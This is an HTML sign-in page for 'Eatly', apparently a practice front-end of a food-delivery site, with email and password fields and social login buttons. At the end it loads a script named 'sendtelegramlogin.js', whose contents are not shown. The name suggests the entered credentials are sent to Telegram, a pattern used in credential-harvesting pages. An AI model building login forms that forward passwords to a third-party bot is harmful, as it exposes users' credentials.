<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Eatly - Figma</title>
    <link rel="icon" href="../images/header/Logo eatly.png" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
      rel="stylesheet"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="../sass/main.scss" />
    <link rel="stylesheet" href="../sass/main.css" />
  </head>
  <body>
   <main">
<section class="login">
  <div class="login__container">

  
    <div class="login__left">
      <div class="login__logo">
        <a href="/"><img src="../images/sign-up/Logo (1).png" alt="Eatly" /></a>
      </div>

      <h2 class="login__title">Sign In To Eatly</h2>
      <div class="login__socials">
         <a href="https://www.google.com/"> 
        <button class="login__social">
          <img src="../images/sign-up/G.png" alt="Google">
        </button></a>
           <a href="https://www.apple.com/"> 
        <button class="login__social">
          <img src="../images/sign-up/laptop.png" alt="Apple">
        </button></a>
      </div>

      <div class="login__or">OR</div>

      
      <form class="login__form" id="loginForm">

        <div class="login__field">
          <img src="../images/sign-up/Email.png" alt="">
          <input
            type="email"
            id="user-email"
            placeholder="TomHill@Mail.com"
            required
          />
        </div>

        <div class="login__field login__password">
          <img src="../images/sign-up/lock.png" alt="">
          <input
            type="password"
            id="user-password"
            placeholder="********"
            required
          />
          <button type="button" class="login__eye" id="togglePassword">üëÅ</button>
        </div>

        <a href="#" class="login__forgot">Forget Password ?</a>

        <button class="login__btn" type="submit">SIGN IN</button>
      </form>

      <p class="login__signup">
        Create A New Account?
        <a href="#">Sign Up</a>
      </p>
    </div>

    
    <div class="login__right">
      <div class="login__content">
        <img src="../images/sign-up/img-right.png" alt="Food">
        <h3>Find Foods With Love</h3>
        <p>
          Eatly Is The Food Delivery Dashboard And Having More Than 2K+ Dishes
          Including Asian, Chinese, Italians And Many More.
        </p>
      </div>
    </div>

  </div>
</section>

   </main>
    <script src="../sendtelegramlogin.js"></script>
  </body>
</html>
